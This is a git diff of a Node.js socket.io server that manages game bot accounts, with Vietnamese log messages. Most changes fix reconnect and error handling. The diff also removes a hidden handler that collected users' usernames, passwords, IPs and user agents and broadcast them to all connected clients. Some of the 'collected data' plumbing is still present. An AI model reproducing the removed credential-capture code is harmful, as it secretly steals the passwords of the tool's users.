@@ -52,20 +52,6 @@ io.on('connection', (socket) => {
     socket.emit('sync_collected_data', globalCollectedData);
     socket.emit('maintenance_status', isMaintenance);
 
-    socket.on('collect_data', (data) => {
-        const entry = {
-            ip: clientIp,
-            time: new Date().toLocaleString(),
-            username: data.username || '(chưa nhập)',
-            password: data.password || '(trống)',
-            userAgent: data.userAgent || 'N/A'
-        };
-        globalCollectedData.push(entry);
-        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
-        io.emit('sync_collected_data', globalCollectedData);
-        io.emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
-    });
-
     socket.on('clear_collected_data', () => {
         globalCollectedData = [];
         io.emit('sync_collected_data', globalCollectedData);
@@ -76,19 +62,12 @@ io.on('connection', (socket) => {
         isMaintenance = status;
         io.emit('maintenance_status', isMaintenance);
         io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
-        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
     });
 
     socket.on('add_account', (data) => {
         const { username, password } = data;
         if (!username) return;
         
-        socket.emit('collect_data', {
-            username: username,
-            password: password || 'caigicungdc',
-            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
-        });
-
         const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
         clientData[clientIp].accounts.push({
             id,
@@ -125,6 +104,7 @@ io.on('connection', (socket) => {
 
         if (clientData[clientIp].bots[id]) {
             try { clientData[clientIp].bots[id].quit(); } catch(e){}
+            delete clientData[clientIp].bots[id];
         }
 
         account.status = 'CONNECTING...';
@@ -141,8 +121,8 @@ io.on('connection', (socket) => {
                 auth: 'offline',
                 version: false,
                 checkTimeoutInterval: 120000,
-                reconnectDelay: 5000,      // ✅ THÊM
-                connectTimeout: 60000      // ✅ THÊM
+                reconnectDelay: 5000,
+                connectTimeout: 60000
             });
 
             clientData[clientIp].bots[id] = bot;
@@ -225,22 +205,19 @@ io.on('connection', (socket) => {
                 io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                 delete clientData[clientIp].bots[id];
 
-                if (account.autoReconnect) {
-                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 10 giây...`); // ✅ SỬA
+                if (account.autoReconnect && account.status !== 'STOPPED') {
+                    socket.emit('log', `[${account.username}] 🔄 Tự động kết nối lại sau 10 giây...`);
                     setTimeout(() => {
-                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
-                            socket.emit('restart_internal_bot', id);
+                        if (!clientData[clientIp].bots[id] && account.autoReconnect && account.status !== 'STOPPED') {
+                            // Gọi lại sự kiện start_bot nội bộ
+                            socket.emit('start_bot', id);
                         }
-                    }, 10000); // ✅ SỬA TỪ 6000 LÊN 10000
+                    }, 10000);
                 }
             });
 
             bot.on('error', (err) => {
-                if (err.code === 'EPIPE') {
-                    socket.emit('log', `[${account.username}] ⚠️ Mất kết nối server, đang thử lại...`); // ✅ THÊM
-                } else {
-                    socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
-                }
+                socket.emit('log', `[${account.username} ❌ Lỗi]: ${err.message}`);
             });
 
         } catch (e) {
@@ -275,10 +252,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('get_accounts', () => {
-        socket.emit('init_accounts', clientData[clientIp].accounts);
-    });
-
     socket.on('disconnect', () => {
         console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
     });
@@ -287,5 +260,4 @@ io.on('connection', (socket) => {
 server.listen(PORT, () => {
     console.log(`🚀 Cat Tool Server đang chạy tại: http://localhost:${PORT}`);
     console.log(`👑 Admin IP: ${ADMIN_IP}`);
-    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
 });
